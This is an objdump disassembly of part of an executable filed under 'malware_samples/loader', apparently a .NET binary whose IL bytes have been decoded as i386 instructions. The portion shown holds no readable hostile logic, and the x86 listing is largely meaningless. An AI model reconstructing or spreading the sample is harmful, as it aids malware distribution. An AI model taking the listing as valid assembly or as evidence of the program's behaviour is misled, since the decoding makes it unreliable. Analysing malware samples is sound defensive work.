
malware_samples/loader/435bf9bbd0678035d20b644eaccb3cce2062d90a8a870a07c3cc8b5d6733ffa4.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	34 67                	xor    $0x67,%al
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 38 3a 00    	add    %al,0x3a3800
  402013:	00 a8 2a 00 00 03    	add    %ch,0x300002a(%eax)
  402019:	00 02                	add    %al,(%edx)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
  402020:	e0 64                	loopne 0x402086
  402022:	00 00                	add    %al,(%eax)
  402024:	70 01                	jo     0x402027
	...
  40204e:	00 00                	add    %al,(%eax)
  402050:	5a                   	pop    %edx
  402051:	28 18                	sub    %bl,(%eax)
  402053:	00 00                	add    %al,(%eax)
  402055:	0a 16                	or     (%esi),%dl
  402057:	28 19                	sub    %bl,(%ecx)
  402059:	00 00                	add    %al,(%eax)
  40205b:	0a 73 09             	or     0x9(%ebx),%dh
  40205e:	00 00                	add    %al,(%eax)
  402060:	06                   	push   %es
  402061:	28 1a                	sub    %bl,(%edx)
  402063:	00 00                	add    %al,(%eax)
  402065:	0a 2a                	or     (%edx),%ch
  402067:	1e                   	push   %ds
  402068:	02 28                	add    (%eax),%ch
  40206a:	1b 00                	sbb    (%eax),%eax
  40206c:	00 0a                	add    %cl,(%edx)
  40206e:	2a ae 7e 01 00 00    	sub    0x17e(%esi),%ch
  402074:	04 2d                	add    $0x2d,%al
  402076:	1e                   	push   %ds
  402077:	72 01                	jb     0x40207a
  402079:	00 00                	add    %al,(%eax)
  40207b:	70 d0                	jo     0x40204d
  40207d:	03 00                	add    (%eax),%eax
  40207f:	00 02                	add    %al,(%edx)
  402081:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402084:	00 0a                	add    %cl,(%edx)
  402086:	6f                   	outsl  %ds:(%esi),(%dx)
  402087:	1d 00 00 0a 73       	sbb    $0x730a0000,%eax
  40208c:	1e                   	push   %ds
  40208d:	00 00                	add    %al,(%eax)
  40208f:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  402095:	7e 01                	jle    0x402098
  402097:	00 00                	add    %al,(%eax)
  402099:	04 2a                	add    $0x2a,%al
  40209b:	1a 7e 02             	sbb    0x2(%esi),%bh
  40209e:	00 00                	add    %al,(%eax)
  4020a0:	04 2a                	add    $0x2a,%al
  4020a2:	1e                   	push   %ds
  4020a3:	02 80 02 00 00 04    	add    0x4000002(%eax),%al
  4020a9:	2a 1a                	sub    (%edx),%bl
  4020ab:	7e 03                	jle    0x4020b0
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	04 2a                	add    $0x2a,%al
  4020b1:	1e                   	push   %ds
  4020b2:	02 28                	add    (%eax),%ch
  4020b4:	1f                   	pop    %ds
  4020b5:	00 00                	add    %al,(%eax)
  4020b7:	0a 2a                	or     (%edx),%ch
  4020b9:	56                   	push   %esi
  4020ba:	73 07                	jae    0x4020c3
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	06                   	push   %es
  4020bf:	28 20                	sub    %ah,(%eax)
  4020c1:	00 00                	add    %al,(%eax)
  4020c3:	0a 74 04 00          	or     0x0(%esp,%eax,1),%dh
  4020c7:	00 02                	add    %al,(%edx)
  4020c9:	80 03 00             	addb   $0x0,(%ebx)
  4020cc:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4020cf:	36 02 28             	add    %ss:(%eax),%ch
  4020d2:	21 00                	and    %eax,(%eax)
  4020d4:	00 0a                	add    %cl,(%edx)
  4020d6:	02 28                	add    (%eax),%ch
  4020d8:	14 00                	adc    $0x0,%al
  4020da:	00 06                	add    %al,(%esi)
  4020dc:	2a 00                	sub    (%eax),%al
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	13 30                	adc    (%eax),%esi
  4020e2:	02 00                	add    (%eax),%al
  4020e4:	37                   	aaa
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	00 01                	add    %al,(%ecx)
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	11 12                	adc    %edx,(%edx)
  4020ed:	00 28                	add    %ch,(%eax)
  4020ef:	22 00                	and    (%eax),%al
  4020f1:	00 0a                	add    %cl,(%edx)
  4020f3:	7d 1c                	jge    0x402111
  4020f5:	00 00                	add    %al,(%eax)
  4020f7:	04 12                	add    $0x12,%al
  4020f9:	00 03                	add    %al,(%ebx)
  4020fb:	7d 1d                	jge    0x40211a
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	04 12                	add    $0x12,%al
  402101:	00 15 7d 1b 00 00    	add    %dl,0x1b7d
  402107:	04 12                	add    $0x12,%al
  402109:	00 7c 1c 00          	add    %bh,0x0(%esp,%ebx,1)
  40210d:	00 04 12             	add    %al,(%edx,%edx,1)
  402110:	00 28                	add    %ch,(%eax)
  402112:	01 00                	add    %eax,(%eax)
  402114:	00 2b                	add    %ch,(%ebx)
  402116:	12 00                	adc    (%eax),%al
  402118:	7c 1c                	jl     0x402136
  40211a:	00 00                	add    %al,(%eax)
  40211c:	04 28                	add    $0x28,%al
  40211e:	24 00                	and    $0x0,%al
  402120:	00 0a                	add    %cl,(%edx)
  402122:	2a 00                	sub    (%eax),%al
  402124:	13 30                	adc    (%eax),%esi
  402126:	02 00                	add    (%eax),%al
  402128:	37                   	aaa
  402129:	00 00                	add    %al,(%eax)
  40212b:	00 02                	add    %al,(%edx)
  40212d:	00 00                	add    %al,(%eax)
  40212f:	11 12                	adc    %edx,(%edx)
  402131:	00 28                	add    %ch,(%eax)
  402133:	25 00 00 0a 7d       	and    $0x7d0a0000,%eax
  402138:	38 00                	cmp    %al,(%eax)
  40213a:	00 04 12             	add    %al,(%edx,%edx,1)
  40213d:	00 03                	add    %al,(%ebx)
  40213f:	7d 39                	jge    0x40217a
  402141:	00 00                	add    %al,(%eax)
  402143:	04 12                	add    $0x12,%al
  402145:	00 15 7d 37 00 00    	add    %dl,0x377d
  40214b:	04 12                	add    $0x12,%al
  40214d:	00 7c 38 00          	add    %bh,0x0(%eax,%edi,1)
  402151:	00 04 12             	add    %al,(%edx,%edx,1)
  402154:	00 28                	add    %ch,(%eax)
  402156:	02 00                	add    (%eax),%al
  402158:	00 2b                	add    %ch,(%ebx)
  40215a:	12 00                	adc    (%eax),%al
  40215c:	7c 38                	jl     0x402196
  40215e:	00 00                	add    %al,(%eax)
  402160:	04 28                	add    $0x28,%al
  402162:	27                   	daa
  402163:	00 00                	add    %al,(%eax)
  402165:	0a 2a                	or     (%edx),%ch
  402167:	00 13                	add    %dl,(%ebx)
  402169:	30 02                	xor    %al,(%edx)
  40216b:	00 3f                	add    %bh,(%edi)
  40216d:	00 00                	add    %al,(%eax)
  40216f:	00 03                	add    %al,(%ebx)
  402171:	00 00                	add    %al,(%eax)
  402173:	11 12                	adc    %edx,(%edx)
  402175:	00 28                	add    %ch,(%eax)
  402177:	25 00 00 0a 7d       	and    $0x7d0a0000,%eax
  40217c:	20 00                	and    %al,(%eax)
  40217e:	00 04 12             	add    %al,(%edx,%edx,1)
  402181:	00 02                	add    %al,(%edx)
  402183:	7d 21                	jge    0x4021a6
  402185:	00 00                	add    %al,(%eax)
  402187:	04 12                	add    $0x12,%al
  402189:	00 03                	add    %al,(%ebx)
  40218b:	7d 22                	jge    0x4021af
  40218d:	00 00                	add    %al,(%eax)
  40218f:	04 12                	add    $0x12,%al
  402191:	00 15 7d 1f 00 00    	add    %dl,0x1f7d
  402197:	04 12                	add    $0x12,%al
  402199:	00 7c 20 00          	add    %bh,0x0(%eax,%eiz,1)
  40219d:	00 04 12             	add    %al,(%edx,%edx,1)
  4021a0:	00 28                	add    %ch,(%eax)
  4021a2:	03 00                	add    (%eax),%eax
  4021a4:	00 2b                	add    %ch,(%ebx)
  4021a6:	12 00                	adc    (%eax),%al
  4021a8:	7c 20                	jl     0x4021ca
  4021aa:	00 00                	add    %al,(%eax)
  4021ac:	04 28                	add    $0x28,%al
  4021ae:	27                   	daa
  4021af:	00 00                	add    %al,(%eax)
  4021b1:	0a 2a                	or     (%edx),%ch
  4021b3:	00 13                	add    %dl,(%ebx)
  4021b5:	30 02                	xor    %al,(%edx)
  4021b7:	00 58 00             	add    %bl,0x0(%eax)
  4021ba:	00 00                	add    %al,(%eax)
  4021bc:	04 00                	add    $0x0,%al
  4021be:	00 11                	add    %dl,(%ecx)
  4021c0:	12 00                	adc    (%eax),%al
  4021c2:	28 25 00 00 0a 7d    	sub    %ah,0x7d0a0000
  4021c8:	3c 00                	cmp    $0x0,%al
  4021ca:	00 04 12             	add    %al,(%edx,%edx,1)
  4021cd:	00 02                	add    %al,(%edx)
  4021cf:	7d 3d                	jge    0x40220e
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	04 12                	add    $0x12,%al
  4021d5:	00 03                	add    %al,(%ebx)
  4021d7:	7d 3e                	jge    0x402217
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	04 12                	add    $0x12,%al
  4021dd:	00 04 7d 3f 00 00 04 	add    %al,0x400003f(,%edi,2)
  4021e4:	12 00                	adc    (%eax),%al
  4021e6:	05 7d 40 00 00       	add    $0x407d,%eax
  4021eb:	04 12                	add    $0x12,%al
  4021ed:	00 0e                	add    %cl,(%esi)
  4021ef:	04 7d                	add    $0x7d,%al
  4021f1:	41                   	inc    %ecx
  4021f2:	00 00                	add    %al,(%eax)
  4021f4:	04 12                	add    $0x12,%al
  4021f6:	00 15 7d 3b 00 00    	add    %dl,0x3b7d
  4021fc:	04 12                	add    $0x12,%al
  4021fe:	00 7c 3c 00          	add    %bh,0x0(%esp,%edi,1)
  402202:	00 04 12             	add    %al,(%edx,%edx,1)
  402205:	00 28                	add    %ch,(%eax)
  402207:	04 00                	add    $0x0,%al
  402209:	00 2b                	add    %ch,(%ebx)
  40220b:	12 00                	adc    (%eax),%al
  40220d:	7c 3c                	jl     0x40224b
  40220f:	00 00                	add    %al,(%eax)
  402211:	04 28                	add    $0x28,%al
  402213:	27                   	daa
  402214:	00 00                	add    %al,(%eax)
  402216:	0a 2a                	or     (%edx),%ch
  402218:	13 30                	adc    (%eax),%esi
  40221a:	02 00                	add    (%eax),%al
  40221c:	37                   	aaa
  40221d:	00 00                	add    %al,(%eax)
  40221f:	00 05 00 00 11 12    	add    %al,0x12110000
  402225:	00 28                	add    %ch,(%eax)
  402227:	28 00                	sub    %al,(%eax)
  402229:	00 0a                	add    %cl,(%edx)
  40222b:	7d 27                	jge    0x402254
  40222d:	00 00                	add    %al,(%eax)
  40222f:	04 12                	add    $0x12,%al
  402231:	00 03                	add    %al,(%ebx)
  402233:	7d 28                	jge    0x40225d
  402235:	00 00                	add    %al,(%eax)
  402237:	04 12                	add    $0x12,%al
  402239:	00 15 7d 26 00 00    	add    %dl,0x267d
  40223f:	04 12                	add    $0x12,%al
  402241:	00 7c 27 00          	add    %bh,0x0(%edi,%eiz,1)
  402245:	00 04 12             	add    %al,(%edx,%edx,1)
  402248:	00 28                	add    %ch,(%eax)
  40224a:	05 00 00 2b 12       	add    $0x122b0000,%eax
  40224f:	00 7c 27 00          	add    %bh,0x0(%edi,%eiz,1)
  402253:	00 04 28             	add    %al,(%eax,%ebp,1)
  402256:	2a 00                	sub    (%eax),%al
  402258:	00 0a                	add    %cl,(%edx)
  40225a:	2a 00                	sub    (%eax),%al
  40225c:	13 30                	adc    (%eax),%esi
  40225e:	02 00                	add    (%eax),%al
  402260:	2b 00                	sub    (%eax),%eax
  402262:	00 00                	add    %al,(%eax)
  402264:	06                   	push   %es
  402265:	00 00                	add    %al,(%eax)
  402267:	11 12                	adc    %edx,(%edx)
  402269:	00 28                	add    %ch,(%eax)
  40226b:	2b 00                	sub    (%eax),%eax
  40226d:	00 0a                	add    %cl,(%edx)
  40226f:	7d 48                	jge    0x4022b9
  402271:	00 00                	add    %al,(%eax)
  402273:	04 12                	add    $0x12,%al
  402275:	00 02                	add    %al,(%edx)
  402277:	7d 49                	jge    0x4022c2
  402279:	00 00                	add    %al,(%eax)
  40227b:	04 12                	add    $0x12,%al
  40227d:	00 15 7d 47 00 00    	add    %dl,0x477d
  402283:	04 12                	add    $0x12,%al
  402285:	00 7c 48 00          	add    %bh,0x0(%eax,%ecx,2)
  402289:	00 04 12             	add    %al,(%edx,%edx,1)
  40228c:	00 28                	add    %ch,(%eax)
  40228e:	06                   	push   %es
  40228f:	00 00                	add    %al,(%eax)
  402291:	2b 2a                	sub    (%edx),%ebp
  402293:	00 13                	add    %dl,(%ebx)
  402295:	30 02                	xor    %al,(%edx)
  402297:	00 37                	add    %dh,(%edi)
  402299:	00 00                	add    %al,(%eax)
  40229b:	00 07                	add    %al,(%edi)
  40229d:	00 00                	add    %al,(%eax)
  40229f:	11 12                	adc    %edx,(%edx)
  4022a1:	00 28                	add    %ch,(%eax)
  4022a3:	25 00 00 0a 7d       	and    $0x7d0a0000,%eax
  4022a8:	2b 00                	sub    (%eax),%eax
  4022aa:	00 04 12             	add    %al,(%edx,%edx,1)
  4022ad:	00 02                	add    %al,(%edx)
  4022af:	7d 2c                	jge    0x4022dd
  4022b1:	00 00                	add    %al,(%eax)
  4022b3:	04 12                	add    $0x12,%al
  4022b5:	00 15 7d 2a 00 00    	add    %dl,0x2a7d
  4022bb:	04 12                	add    $0x12,%al
  4022bd:	00 7c 2b 00          	add    %bh,0x0(%ebx,%ebp,1)
  4022c1:	00 04 12             	add    %al,(%edx,%edx,1)
  4022c4:	00 28                	add    %ch,(%eax)
  4022c6:	07                   	pop    %es
  4022c7:	00 00                	add    %al,(%eax)
  4022c9:	2b 12                	sub    (%edx),%edx
  4022cb:	00 7c 2b 00          	add    %bh,0x0(%ebx,%ebp,1)
  4022cf:	00 04 28             	add    %al,(%eax,%ebp,1)
  4022d2:	27                   	daa
  4022d3:	00 00                	add    %al,(%eax)
  4022d5:	0a 2a                	or     (%edx),%ch
  4022d7:	00 13                	add    %dl,(%ebx)
  4022d9:	30 02                	xor    %al,(%edx)
  4022db:	00 2b                	add    %ch,(%ebx)
  4022dd:	00 00                	add    %al,(%eax)
  4022df:	00 08                	add    %cl,(%eax)
  4022e1:	00 00                	add    %al,(%eax)
  4022e3:	11 12                	adc    %edx,(%edx)
  4022e5:	00 28                	add    %ch,(%eax)
  4022e7:	2b 00                	sub    (%eax),%eax
  4022e9:	00 0a                	add    %cl,(%edx)
  4022eb:	7d 44                	jge    0x402331
  4022ed:	00 00                	add    %al,(%eax)
  4022ef:	04 12                	add    $0x12,%al
  4022f1:	00 02                	add    %al,(%edx)
  4022f3:	7d 45                	jge    0x40233a
  4022f5:	00 00                	add    %al,(%eax)
  4022f7:	04 12                	add    $0x12,%al
  4022f9:	00 15 7d 43 00 00    	add    %dl,0x437d
  4022ff:	04 12                	add    $0x12,%al
  402301:	00 7c 44 00          	add    %bh,0x0(%esp,%eax,2)
  402305:	00 04 12             	add    %al,(%edx,%edx,1)
  402308:	00 28                	add    %ch,(%eax)
  40230a:	08 00                	or     %al,(%eax)
  40230c:	00 2b                	add    %ch,(%ebx)
  40230e:	2a 00                	sub    (%eax),%al
  402310:	13 30                	adc    (%eax),%esi
  402312:	02 00                	add    (%eax),%al
  402314:	37                   	aaa
  402315:	00 00                	add    %al,(%eax)
  402317:	00 09                	add    %cl,(%ecx)
  402319:	00 00                	add    %al,(%eax)
  40231b:	11 12                	adc    %edx,(%edx)
  40231d:	00 28                	add    %ch,(%eax)
  40231f:	25 00 00 0a 7d       	and    $0x7d0a0000,%eax
  402324:	34 00                	xor    $0x0,%al
  402326:	00 04 12             	add    %al,(%edx,%edx,1)
  402329:	00 02                	add    %al,(%edx)
  40232b:	7d 35                	jge    0x402362
  40232d:	00 00                	add    %al,(%eax)
  40232f:	04 12                	add    $0x12,%al
  402331:	00 15 7d 33 00 00    	add    %dl,0x337d
  402337:	04 12                	add    $0x12,%al
  402339:	00 7c 34 00          	add    %bh,0x0(%esp,%esi,1)
  40233d:	00 04 12             	add    %al,(%edx,%edx,1)
  402340:	00 28                	add    %ch,(%eax)
  402342:	09 00                	or     %eax,(%eax)
  402344:	00 2b                	add    %ch,(%ebx)
  402346:	12 00                	adc    (%eax),%al
  402348:	7c 34                	jl     0x40237e
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 28                	add    $0x28,%al
  40234e:	27                   	daa
  40234f:	00 00                	add    %al,(%eax)
  402351:	0a 2a                	or     (%edx),%ch
  402353:	7a 03                	jp     0x402358
  402355:	2c 13                	sub    $0x13,%al
  402357:	02 7b 04             	add    0x4(%ebx),%bh
  40235a:	00 00                	add    %al,(%eax)
  40235c:	04 2c                	add    $0x2c,%al
  40235e:	0b 02                	or     (%edx),%eax
  402360:	7b 04                	jnp    0x402366
  402362:	00 00                	add    %al,(%eax)
  402364:	04 6f                	add    $0x6f,%al
  402366:	2d 00 00 0a 02       	sub    $0x20a0000,%eax
  40236b:	03 28                	add    (%eax),%ebp
  40236d:	2e 00 00             	add    %al,%cs:(%eax)
  402370:	0a 2a                	or     (%edx),%ch
  402372:	00 00                	add    %al,(%eax)
  402374:	13 30                	adc    (%eax),%esi
  402376:	04 00                	add    $0x0,%al
  402378:	74 06                	je     0x402380
  40237a:	00 00                	add    %al,(%eax)
  40237c:	00 00                	add    %al,(%eax)
  40237e:	00 00                	add    %al,(%eax)
  402380:	02 73 2f             	add    0x2f(%ebx),%dh
  402383:	00 00                	add    %al,(%eax)
  402385:	0a 7d 04             	or     0x4(%ebp),%bh
  402388:	00 00                	add    %al,(%eax)
  40238a:	04 02                	add    $0x2,%al
  40238c:	73 30                	jae    0x4023be
  40238e:	00 00                	add    %al,(%eax)
  402390:	0a 7d 05             	or     0x5(%ebp),%bh
  402393:	00 00                	add    %al,(%eax)
  402395:	04 02                	add    $0x2,%al
  402397:	73 31                	jae    0x4023ca
  402399:	00 00                	add    %al,(%eax)
  40239b:	0a 7d 0a             	or     0xa(%ebp),%bh
  40239e:	00 00                	add    %al,(%eax)
  4023a0:	04 02                	add    $0x2,%al
  4023a2:	73 30                	jae    0x4023d4
  4023a4:	00 00                	add    %al,(%eax)
  4023a6:	0a 7d 0b             	or     0xb(%ebp),%bh
  4023a9:	00 00                	add    %al,(%eax)
  4023ab:	04 02                	add    $0x2,%al
  4023ad:	73 32                	jae    0x4023e1
  4023af:	00 00                	add    %al,(%eax)
  4023b1:	0a 7d 0c             	or     0xc(%ebp),%bh
  4023b4:	00 00                	add    %al,(%eax)
  4023b6:	04 02                	add    $0x2,%al
  4023b8:	73 32                	jae    0x4023ec
  4023ba:	00 00                	add    %al,(%eax)
  4023bc:	0a 7d 0d             	or     0xd(%ebp),%bh
  4023bf:	00 00                	add    %al,(%eax)
  4023c1:	04 02                	add    $0x2,%al
  4023c3:	73 33                	jae    0x4023f8
  4023c5:	00 00                	add    %al,(%eax)
  4023c7:	0a 7d 08             	or     0x8(%ebp),%bh
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	04 02                	add    $0x2,%al
  4023ce:	73 34                	jae    0x402404
  4023d0:	00 00                	add    %al,(%eax)
  4023d2:	0a 7d 07             	or     0x7(%ebp),%bh
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	04 02                	add    $0x2,%al
  4023d9:	73 35                	jae    0x402410
  4023db:	00 00                	add    %al,(%eax)
  4023dd:	0a 7d 06             	or     0x6(%ebp),%bh
  4023e0:	00 00                	add    %al,(%eax)
  4023e2:	04 02                	add    $0x2,%al
  4023e4:	02 7b 04             	add    0x4(%ebx),%bh
  4023e7:	00 00                	add    %al,(%eax)
  4023e9:	04 73                	add    $0x73,%al
  4023eb:	36 00 00             	add    %al,%ss:(%eax)
  4023ee:	0a 7d 09             	or     0x9(%ebp),%bh
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	04 02                	add    $0x2,%al
  4023f5:	02 7b 04             	add    0x4(%ebx),%bh
  4023f8:	00 00                	add    %al,(%eax)
  4023fa:	04 73                	add    $0x73,%al
  4023fc:	37                   	aaa
  4023fd:	00 00                	add    %al,(%eax)
  4023ff:	0a 7d 0e             	or     0xe(%ebp),%bh
  402402:	00 00                	add    %al,(%eax)
  402404:	04 02                	add    $0x2,%al
  402406:	7b 05                	jnp    0x40240d
  402408:	00 00                	add    %al,(%eax)
  40240a:	04 6f                	add    $0x6f,%al
  40240c:	38 00                	cmp    %al,(%eax)
  40240e:	00 0a                	add    %cl,(%edx)
  402410:	02 7b 0b             	add    0xb(%ebx),%bh
  402413:	00 00                	add    %al,(%eax)
  402415:	04 6f                	add    $0x6f,%al
  402417:	38 00                	cmp    %al,(%eax)
  402419:	00 0a                	add    %cl,(%edx)
  40241b:	02 28                	add    (%eax),%ch
  40241d:	38 00                	cmp    %al,(%eax)
  40241f:	00 0a                	add    %cl,(%edx)
  402421:	02 7b 05             	add    0x5(%ebx),%bh
  402424:	00 00                	add    %al,(%eax)
  402426:	04 1f                	add    $0x1f,%al
  402428:	0f 1f 0f             	nopl   (%edi)
  40242b:	1f                   	pop    %ds
  40242c:	14 28                	adc    $0x28,%al
  40242e:	39 00                	cmp    %eax,(%eax)
  402430:	00 0a                	add    %cl,(%edx)
  402432:	6f                   	outsl  %ds:(%esi),(%dx)
  402433:	3a 00                	cmp    (%eax),%al
  402435:	00 0a                	add    %cl,(%edx)
  402437:	02 7b 05             	add    0x5(%ebx),%bh
  40243a:	00 00                	add    %al,(%eax)
  40243c:	04 6f                	add    $0x6f,%al
  40243e:	3b 00                	cmp    (%eax),%eax
  402440:	00 0a                	add    %cl,(%edx)
  402442:	02 7b 0a             	add    0xa(%ebx),%bh
  402445:	00 00                	add    %al,(%eax)
  402447:	04 6f                	add    $0x6f,%al
  402449:	3c 00                	cmp    $0x0,%al
  40244b:	00 0a                	add    %cl,(%edx)
  40244d:	02 7b 05             	add    0x5(%ebx),%bh
  402450:	00 00                	add    %al,(%eax)
  402452:	04 6f                	add    $0x6f,%al
  402454:	3b 00                	cmp    (%eax),%eax
  402456:	00 0a                	add    %cl,(%edx)
  402458:	02 7b 0b             	add    0xb(%ebx),%bh
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 6f                	add    $0x6f,%al
  40245f:	3c 00                	cmp    $0x0,%al
  402461:	00 0a                	add    %cl,(%edx)
  402463:	02 7b 05             	add    0x5(%ebx),%bh
  402466:	00 00                	add    %al,(%eax)
  402468:	04 6f                	add    $0x6f,%al
  40246a:	3b 00                	cmp    (%eax),%eax
  40246c:	00 0a                	add    %cl,(%edx)
  40246e:	02 7b 08             	add    0x8(%ebx),%bh
  402471:	00 00                	add    %al,(%eax)
  402473:	04 6f                	add    $0x6f,%al
  402475:	3c 00                	cmp    $0x0,%al
  402477:	00 0a                	add    %cl,(%edx)
  402479:	02 7b 05             	add    0x5(%ebx),%bh
  40247c:	00 00                	add    %al,(%eax)
  40247e:	04 6f                	add    $0x6f,%al
  402480:	3b 00                	cmp    (%eax),%eax
  402482:	00 0a                	add    %cl,(%edx)
  402484:	02 7b 07             	add    0x7(%ebx),%bh
  402487:	00 00                	add    %al,(%eax)
  402489:	04 6f                	add    $0x6f,%al
  40248b:	3c 00                	cmp    $0x0,%al
  40248d:	00 0a                	add    %cl,(%edx)
  40248f:	02 7b 05             	add    0x5(%ebx),%bh
  402492:	00 00                	add    %al,(%eax)
  402494:	04 6f                	add    $0x6f,%al
  402496:	3b 00                	cmp    (%eax),%eax
  402498:	00 0a                	add    %cl,(%edx)
  40249a:	02 7b 06             	add    0x6(%ebx),%bh
  40249d:	00 00                	add    %al,(%eax)
  40249f:	04 6f                	add    $0x6f,%al
  4024a1:	3c 00                	cmp    $0x0,%al
  4024a3:	00 0a                	add    %cl,(%edx)
  4024a5:	02 7b 05             	add    0x5(%ebx),%bh
  4024a8:	00 00                	add    %al,(%eax)
  4024aa:	04 1b                	add    $0x1b,%al
  4024ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ad:	3d 00 00 0a 02       	cmp    $0x20a0000,%eax
  4024b2:	7b 05                	jnp    0x4024b9
  4024b4:	00 00                	add    %al,(%eax)
  4024b6:	04 16                	add    $0x16,%al
  4024b8:	16                   	push   %ss
  4024b9:	73 3e                	jae    0x4024f9
  4024bb:	00 00                	add    %al,(%eax)
  4024bd:	0a 6f 3f             	or     0x3f(%edi),%ch
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	0a 02                	or     (%edx),%al
  4024c4:	7b 05                	jnp    0x4024cb
  4024c6:	00 00                	add    %al,(%eax)
  4024c8:	04 72                	add    $0x72,%al
  4024ca:	4d                   	dec    %ebp
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	70 6f                	jo     0x40253e
  4024cf:	40                   	inc    %eax
  4024d0:	00 00                	add    %al,(%eax)
  4024d2:	0a 02                	or     (%edx),%al
  4024d4:	7b 05                	jnp    0x4024db
  4024d6:	00 00                	add    %al,(%eax)
  4024d8:	04 20                	add    $0x20,%al
  4024da:	02 02                	add    (%edx),%al
  4024dc:	00 00                	add    %al,(%eax)
  4024de:	20 5b 01             	and    %bl,0x1(%ebx)
  4024e1:	00 00                	add    %al,(%eax)
  4024e3:	73 41                	jae    0x402526
  4024e5:	00 00                	add    %al,(%eax)
  4024e7:	0a 6f 42             	or     0x42(%edi),%ch
  4024ea:	00 00                	add    %al,(%eax)
  4024ec:	0a 02                	or     (%edx),%al
  4024ee:	7b 05                	jnp    0x4024f5
  4024f0:	00 00                	add    %al,(%eax)
  4024f2:	04 16                	add    $0x16,%al
  4024f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f5:	43                   	inc    %ebx
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	0a 02                	or     (%edx),%al
  4024fa:	7b 0a                	jnp    0x402506
  4024fc:	00 00                	add    %al,(%eax)
  4024fe:	04 28                	add    $0x28,%al
  402500:	44                   	inc    %esp
  402501:	00 00                	add    %al,(%eax)
  402503:	0a 6f 45             	or     0x45(%edi),%ch
  402506:	00 00                	add    %al,(%eax)
  402508:	0a 02                	or     (%edx),%al
  40250a:	7b 0a                	jnp    0x402516
  40250c:	00 00                	add    %al,(%eax)
  40250e:	04 16                	add    $0x16,%al
  402510:	1f                   	pop    %ds
  402511:	21 73 3e             	and    %esi,0x3e(%ebx)
  402514:	00 00                	add    %al,(%eax)
  402516:	0a 6f 3f             	or     0x3f(%edi),%ch
  402519:	00 00                	add    %al,(%eax)
  40251b:	0a 02                	or     (%edx),%al
  40251d:	7b 0a                	jnp    0x402529
  40251f:	00 00                	add    %al,(%eax)
  402521:	04 72                	add    $0x72,%al
  402523:	65 00 00             	add    %al,%gs:(%eax)
  402526:	70 6f                	jo     0x402597
  402528:	40                   	inc    %eax
  402529:	00 00                	add    %al,(%eax)
  40252b:	0a 02                	or     (%edx),%al
  40252d:	7b 0a                	jnp    0x402539
  40252f:	00 00                	add    %al,(%eax)
  402531:	04 20                	add    $0x20,%al
  402533:	02 02                	add    (%edx),%al
  402535:	00 00                	add    %al,(%eax)
  402537:	1f                   	pop    %ds
  402538:	0a 73 41             	or     0x41(%ebx),%dh
  40253b:	00 00                	add    %al,(%eax)
  40253d:	0a 6f 42             	or     0x42(%edi),%ch
  402540:	00 00                	add    %al,(%eax)
  402542:	0a 02                	or     (%edx),%al
  402544:	7b 0a                	jnp    0x402550
  402546:	00 00                	add    %al,(%eax)
  402548:	04 1b                	add    $0x1b,%al
  40254a:	6f                   	outsl  %ds:(%esi),(%dx)
  40254b:	43                   	inc    %ebx
  40254c:	00 00                	add    %al,(%eax)
  40254e:	0a 02                	or     (%edx),%al
  402550:	7b 0b                	jnp    0x40255d
  402552:	00 00                	add    %al,(%eax)
  402554:	04 6f                	add    $0x6f,%al
  402556:	3b 00                	cmp    (%eax),%eax
  402558:	00 0a                	add    %cl,(%edx)
  40255a:	02 7b 0c             	add    0xc(%ebx),%bh
  40255d:	00 00                	add    %al,(%eax)
  40255f:	04 6f                	add    $0x6f,%al
  402561:	3c 00                	cmp    $0x0,%al
  402563:	00 0a                	add    %cl,(%edx)
  402565:	02 7b 0b             	add    0xb(%ebx),%bh
  402568:	00 00                	add    %al,(%eax)
  40256a:	04 6f                	add    $0x6f,%al
  40256c:	3b 00                	cmp    (%eax),%eax
  40256e:	00 0a                	add    %cl,(%edx)
  402570:	02 7b 0d             	add    0xd(%ebx),%bh
  402573:	00 00                	add    %al,(%eax)
  402575:	04 6f                	add    $0x6f,%al
  402577:	3c 00                	cmp    $0x0,%al
  402579:	00 0a                	add    %cl,(%edx)
  40257b:	02 7b 0b             	add    0xb(%ebx),%bh
  40257e:	00 00                	add    %al,(%eax)
  402580:	04 17                	add    $0x17,%al
  402582:	6f                   	outsl  %ds:(%esi),(%dx)
  402583:	3d 00 00 0a 02       	cmp    $0x20a0000,%eax
  402588:	7b 0b                	jnp    0x402595
  40258a:	00 00                	add    %al,(%eax)
  40258c:	04 16                	add    $0x16,%al
  40258e:	16                   	push   %ss
  40258f:	73 3e                	jae    0x4025cf
  402591:	00 00                	add    %al,(%eax)
  402593:	0a 6f 3f             	or     0x3f(%edi),%ch
  402596:	00 00                	add    %al,(%eax)
  402598:	0a 02                	or     (%edx),%al
  40259a:	7b 0b                	jnp    0x4025a7
  40259c:	00 00                	add    %al,(%eax)
  40259e:	04 72                	add    $0x72,%al
  4025a0:	85 00                	test   %eax,(%eax)
  4025a2:	00 70 6f             	add    %dh,0x6f(%eax)
  4025a5:	40                   	inc    %eax
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	0a 02                	or     (%edx),%al
  4025aa:	7b 0b                	jnp    0x4025b7
